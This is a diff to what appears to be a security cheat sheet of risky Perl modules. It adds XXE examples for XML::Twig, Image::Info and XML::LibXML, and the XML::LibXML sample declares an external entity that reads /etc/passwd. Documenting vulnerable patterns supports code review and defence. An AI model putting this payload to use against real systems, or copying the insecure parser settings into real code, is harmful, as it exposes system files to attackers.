@@ -152,9 +152,43 @@ say "<iframe src></iframe>";
 
 
 ## XXE
-- Image::Info
 - XML::Twig
-- XML::LibXML 
+```perl
+use XML::Twig;
+my $twig = XML::Twig->new( expand_external_ents => 1 );
+$twig->parsefile( "xxe.dtd");
+$twig->print;
+```
+
+- Image::Info
+```perl
+use Image::Info qw(image_info dim);
+ 
+my $info = image_info("image.svg");
+if (my $error = $info->{error}) {
+    die "Can't parse image info: $error\n";
+}
+my $title = $info->{SVG_Title};
+ 
+my($w, $h) = dim($info);
+```
+
+- XML::LibXML
+```perl
+#!/usr/bin/perl -w
+use XML::LibXML;
+ 
+my $xml=<<END;
+<!DOCTYPE root [ <!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+<node>
+    <e>&ent;</e>
+</node>
+END
+
+print XML::LibXML->new()->parse_string($xml);
+```
+
+
 
 ## File
 - unlink
